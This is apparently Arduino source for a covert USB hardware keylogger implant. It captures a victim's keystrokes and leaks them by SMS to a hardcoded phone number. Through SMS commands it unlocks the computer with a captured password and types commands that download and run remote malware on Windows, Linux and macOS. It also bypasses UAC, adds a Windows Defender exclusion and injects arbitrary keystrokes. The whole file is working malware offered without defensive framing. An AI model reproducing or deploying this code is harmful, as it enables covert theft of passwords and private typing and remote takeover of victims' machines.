
/* NOTE: Make sure to edit SoftwareSerial.h to change 
 *  #define _SS_MAX_RX_BUFF 64 // RX buffer size
 *  to
 *  #define _SS_MAX_RX_BUFF 256 // RX buffer size
*/
#include <SoftwareSerial.h>            
#include <Keyboard.h>                  
#include "C_USBhost.h"                

#define LEAK_PHONE_NUMBER "+14422457648"
#define DEBUG true
#define IMPLANT_NAME "Implant 1"

//C_USBhost USBhost = C_USBhost(Serial1, /*debug_state*/DEBUG);
C_USBhost USBhost = C_USBhost(Serial1, /*debug_state*/false);
SoftwareSerial SMSSERIAL(8, 9);

#define SEPARATOR "##"

#define CHAR_LIMIT 140                                
#define BAUD_RATE_SIM800L 57600                    
#define BAUD_RATE_USB_HOST_BOARD 115200             
#define BAUD_RATE_SERIAL 115200                    
 
#define STATE_IDLE 0
#define STATE_WAITING_MSG_RESPONSE 1
#define STATE_WAITING_SMS_RESPONSE 1

#define BEACON_TIME 3 // Time in minutes we will send a beacon to let know it's alive

char TextSms[CHAR_LIMIT+2];                  
int char_count;                              
char backupTextSms[CHAR_LIMIT+2];
unsigned long previousMillis=0;
//int interval=60000;
int interval=3000;
int interval_payload=15000;
String SMS = "";
int passcached=0;
char empty;
byte captured_key;
String substr = "";
bool mutex_SMS = false;
bool pendingSMS = false;
String buffer_keystrokes = "";
unsigned int pendingLength = 0;

// Flush buffer of the SMS serial
void SMSSerialFlush(){
  while(SMSSERIAL.available() > 0) {
    int byte = SMSSERIAL.read();
    Serial.print((char)byte);
  }
}   

String readResponse()
{
  delay(500);
  String res;
  int TIMEOUT = 10 *10; // wait 10 seconds
  int incomingByte  = 0;
  while (!SMSSERIAL.available()) 
  {
    delay(100);
    TIMEOUT--;
    if (TIMEOUT == 0){
      if (DEBUG){
          Serial.println("Timeout reading response");
      }
      return "";
    }
  }
  
  while (SMSSERIAL.available()) 
  {
    incomingByte  = SMSSERIAL.read();
    if (incomingByte == -1){ // this should never happen 
      if (DEBUG){
        Serial.println("There is no data to read from SMSSERIAL");
      }
      break; 
    }
    if (DEBUG){
      Serial.write(char(incomingByte));
    }
    res += char(incomingByte);
  }
  return res;
}

void collectDebugInfo(){
  SMSSERIAL.write("AT+CMEE=1\r\n"); //enable debug
  readResponse();
  Serial.println("--"); 
  
  SMSSERIAL.write("AT\r\n"); //Once the handshake test is successful, it will back to OK
  readResponse();
  Serial.println("--");
  
  SMSSERIAL.write("AT+CSQ\r\n"); //Signal quality test, value range is 0-31 , 31 is the best
  readResponse();
  Serial.println("--");
  
  SMSSERIAL.write("AT+CCID\r\n"); //Read SIM information to confirm whether the SIM is plugged
  readResponse();
  Serial.println("--");

  //read stored sms
  SMSSERIAL.write("AT+CMGL=\"ALL\"\r\n"); 
  readResponse();
  Serial.println("--");

  //check card is properly inserted
  SMSSERIAL.write("AT+CPIN?\r\n"); 
  String res = readResponse();

  if(res.indexOf("CPIN: READY") <= 0){
    Serial.println("The SIM card is not ready to be used. Check you inserted id correctly");
  }
}


// Returns 1 if SMS was sucessfully sent or 0 if not
int sendSMSMessage(String txt){
  mutex_SMS = true;
  SMSSERIAL.write("AT+CMGF=1\r\n");
  delay(2);

  SMSSERIAL.write("AT+CMGS=\"" LEAK_PHONE_NUMBER "\"\r\n"); //phonenumber with land code 
  delay(2);

  SMSSERIAL.write(txt.c_str());
  delay(2);

  SMSSerialFlush();
  
  SMSSERIAL.write((char)26);
  delay(2);
}

/* Multiplatform - Press control twice just to be sure lockscreen picture is gone*/
void unlockComputer(String password){
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.releaseAll();
  delay(300);
  Keyboard.press(KEY_LEFT_CTRL);
  Keyboard.releaseAll();
  delay(300);
  Keyboard.print(password.c_str());
  delay(100);
  Keyboard.press('\n');
  Keyboard.releaseAll();  
}

String getValue(String data, String separator, int index)
{
  int found = 0;
  int strIndex[] = {0, -((int)separator.length())};
  int maxIndex = data.length()-1;

  for(int i=0; i<=maxIndex && found<=index; i++){
    if(data.substring(i, i+ separator.length()) == separator || i==maxIndex){
        found++;
        strIndex[0] = strIndex[1]+separator.length();
        strIndex[1] = (i == maxIndex) ? i+separator.length() : i;
    }
  }

  return found>index ? data.substring(strIndex[0], strIndex[1]) : "";
}

void setup() {
  delay(300);                                              
  Serial.begin(BAUD_RATE_SERIAL);                                                   
  SMSSERIAL.begin(BAUD_RATE_SIM800L);
  USBhost.Begin(BAUD_RATE_USB_HOST_BOARD);                   
  Keyboard.begin();

  SMSSERIAL.write("AT\r\n");
  readResponse();

  // Selects SMS message format as text. Default format is Protocol Data Unit (PDU)
  SMSSERIAL.write("AT+CMGF=1\r\n");
  readResponse();

  if(DEBUG){
      collectDebugInfo();
  }
  
  //Keyboard.press(KEY_RIGHT_GUI);
  //Keyboard.press('l');
  //Keyboard.releaseAll();
                                            
}

void loop() {   
  unsigned long currentMillis = millis();
  captured_key = USBhost.GetKey();    

  // Send a beacon so we know that the implant is up
  // ToDo: this can infere with payloads execution
//  if ((unsigned long)((currentMillis - previousMillis)/ 60000) > BEACON_TIME){
//      sendSMSMessage("Beacon - " IMPLANT_NAME);
//      previousMillis = currentMillis;
//      if(DEBUG){
//          Serial.println("Beacon sent");
//      }
//  }

  //Normalkey capture
  if(captured_key){
    if(captured_key == 8){ // Backspace
      if(buffer_keystrokes.length() > 0){
        buffer_keystrokes = buffer_keystrokes.substring(0, buffer_keystrokes.length() - 1);
      }
    }
    else {
      buffer_keystrokes += (char)captured_key;
      }
    previousMillis = currentMillis;  
  }

  //SMS send
  if (buffer_keystrokes.length() >= CHAR_LIMIT - 1 || (unsigned long)(currentMillis - previousMillis) >= interval && buffer_keystrokes.length() > 5) {
    if (!pendingSMS) {
      // The buffer could hold a lot of characters from previous SMS that couldn't be sent
      String bufferToSend = "";
      if (buffer_keystrokes.length() < CHAR_LIMIT - 1) {
        bufferToSend = buffer_keystrokes;
      }
      else {
        bufferToSend = buffer_keystrokes.substring(0, CHAR_LIMIT - 1);
      }
      if(DEBUG){
        Serial.println("Trying to send message with content: " + bufferToSend);
      }
      
      sendSMSMessage(bufferToSend);
      pendingSMS = true;
      pendingLength = bufferToSend.length();
    } 
    else {
      if(DEBUG){
        Serial.println("There is a SMS pending to be sent...");
      }
    }
  }

  // If there is a pending SMS we check if it was sent, if so we remove the characters sent
  if (pendingSMS) {
    if (SMSSERIAL.available()) {
      String res = SMSSERIAL.readString();
      Serial.println("Message read from SMSSERIAL: " + res);
      if (res.indexOf("CMGS: ") > 0){
        Serial.println("SMS message succesfully sent");
        pendingSMS = false;
        
        SMSSerialFlush(); // just is case there is something else in the serial
        mutex_SMS = false; // we can now listen for commands
        
        // We removed from the buffer the characters that were sent
        buffer_keystrokes = buffer_keystrokes.substring(pendingLength);
      }
      // ToDo: We need to change ERROR for the message receive when a SMS is not sent correctly
      else if (res.indexOf("ERROR: ")) {
        // The SMS couldn't be sent, we need to retry
        if(DEBUG){
          Serial.println("Trying to send message with content: " + buffer_keystrokes.substring(0, pendingLength));
        }
        sendSMSMessage(buffer_keystrokes.substring(0, pendingLength));
      }
    }
  }


   //Payload Method Make sure keyword are unique enough that subject in question wont enter them on their keyboard.
    if (mutex_SMS == false && SMSSERIAL.available()) {
      Serial.println("new SMS");
  
      SMS = SMSSERIAL.readString();      
      Serial.println(SMSSERIAL.readString());

      String SMS_text;
      if(SMS.indexOf("+CMT: ") > -1){ // We got a command
        // Code to remove last new line if exists
        if(SMS.charAt(SMS.length())== '\n' &&  SMS.charAt(SMS.length()-1)== '\r'){
          SMS.remove(SMS.length()-1, SMS.length());
        }
        int new_line_pos = SMS.indexOf("\r\n", 2);
        SMS_text = SMS.substring(new_line_pos +2); // +2 is bc \r\n
        if(DEBUG){
          Serial.println("Received SMS with content:");
          Serial.println(SMS_text);
        }
      }

     
      String payload = getValue(SMS_text,SEPARATOR,0);

      if(DEBUG && payload.length()>0){
          Serial.println("Got payload: " + payload);
        }
      
      if (payload == "unolock_download"){
        String OS = getValue(SMS_text,SEPARATOR,1);
        OS.toLowerCase();
        String password = getValue(SMS_text,SEPARATOR,2);
        String url = getValue(SMS_text,SEPARATOR,3);
  
        // Unlock the computer to download and execute malware
        unlockComputer(password);
        delay(500);
  
        // Download and execute the malware
        if(OS == "win"){
          // Normal user      
          Keyboard.press(KEY_LEFT_GUI);
          Keyboard.press('r');
          Keyboard.releaseAll();
          delay(400);
          Keyboard.print("cmd.exe");
          Keyboard.press('\n');
          Keyboard.releaseAll();
          delay(400);
          String cmd = "bitsadmin /transfer winupdate /download /priority foreground " + url + " %appdata%\\Microsoft\\wintask.exe && start \"\" %appdata%\\Microsoft\\wintask.exe && exit";
          Keyboard.print(cmd.c_str());
          Keyboard.press('\n');
          Keyboard.releaseAll(); 
          delay(400);
          // Lock back
          Keyboard.press(KEY_RIGHT_GUI);
          Keyboard.press('l');
          Keyboard.releaseAll();                 
        }
        
        else if(OS == "lnx"){
          Keyboard.press(KEY_LEFT_GUI);
          Keyboard.press('r');
          Keyboard.releaseAll();
          delay(400);
          Keyboard.print("terminal");
          Keyboard.press('\n');
          Keyboard.releaseAll();
          delay(400);
          String cmd = " x=/tmp/.logCollector; wget --no-check-certificate " + url + " -O ${x}; chmod +x ${x}; ${x}; rm ${x}";
          Keyboard.print(cmd.c_str());
          Keyboard.press('\n');
          Keyboard.releaseAll();
          delay(400);
          // Lock back
          Keyboard.press(KEY_RIGHT_GUI);
          Keyboard.press('l');
          Keyboard.releaseAll();
          
        }
        
        else if(OS == "osx"){
          Keyboard.press(KEY_LEFT_GUI);
          Keyboard.press('r');
          Keyboard.releaseAll();
          delay(400);
          Keyboard.print("terminal");
          Keyboard.press('\n');
          Keyboard.releaseAll();
          delay(400);
          String cmd = " x=/tmp/.logCollector; wget --no-check-certificate " + url + " -O ${x}; chmod +x ${x}; ${x}; rm ${x}";
          Keyboard.print(cmd.c_str());
          Keyboard.press('\n');
          Keyboard.releaseAll();
          delay(400);
          // Lock back
          Keyboard.press(KEY_LEFT_GUI);
          Keyboard.press(KEY_LEFT_CTRL);
          Keyboard.press('q');
          Keyboard.releaseAll();
        }
        else{
          sendSMSMessage("Wrong OS sent for payload");
        }
      }

      
      else if(payload == "win_uac_unlck_dwn"){
        String OS = getValue(SMS_text,SEPARATOR,1);
        OS.toLowerCase();
        String password = getValue(SMS_text,SEPARATOR,2);
        String url = getValue(SMS_text,SEPARATOR,3);
  
        // Unlock the computer to download and execute malware
        unlockComputer(password);
        delay(500);

        // UAC bypass
        Keyboard.press(KEY_LEFT_GUI);
        Keyboard.press('r');
        Keyboard.releaseAll();
        delay(400);
        Keyboard.print("powershell Start-Process cmd -Verb runAs");
        Keyboard.press('\n');
        Keyboard.releaseAll();
        delay(3000);
        
        Keyboard.press(KEY_LEFT_ALT);
        Keyboard.press('y');
        Keyboard.releaseAll();
        delay(500);

        // Add windows defender exception
        String cmd1 = "powershell -inputformat none -outputformat none -NonInteractive -Command Add-MpPreference -ExclusionPath %appdata%";
        Keyboard.print(cmd1.c_str());
        Keyboard.press('\n');
        Keyboard.releaseAll(); 
        delay(500);
        
        String cmd = "bitsadmin /transfer winupdate /download /priority foreground " + url + " %appdata%\\Microsoft\\wintask.exe && start \"\" %appdata%\\Microsoft\\wintask.exe && exit";
        Keyboard.print(cmd.c_str());
        Keyboard.press('\n');
        Keyboard.releaseAll(); 
        
      }

      // Manuall##press##83 72 (in hex)
      // Manual##delay##100
      // Manual##release
      else if(payload == "Manual"){        
        String action = getValue(SMS_text,SEPARATOR,1);
        String argument = getValue(SMS_text,SEPARATOR,2);
   
        if (action == "press"){
          // There can be an unlimited number of keystrokes separated by space
          int n_spaces = 0;
          for(int i=0; i<=argument.length() ;i++){
            if(argument.charAt(i) == ' '){
                n_spaces++;
            }
          }
          for(int i=0; i<=n_spaces ;i++){
              String keystroke = getValue(argument," ",i);
              Keyboard.press((int)strtol(keystroke.c_str(), 0, 16));
          }
          Keyboard.releaseAll();
        }
        else if (action == "print"){
          Keyboard.print(argument.c_str());
        }
        else if (action == "release"){
          Keyboard.releaseAll();
        }
        else if (action == "delay"){
          delay(argument.toInt());
        }
      }

      else{
        if(DEBUG){
          Serial.println("Unknown payload " + payload); 
        }
        sendSMSMessage("Unknown payload '" + payload + "'\nFull message: " + SMS_text);
      }
    }
}
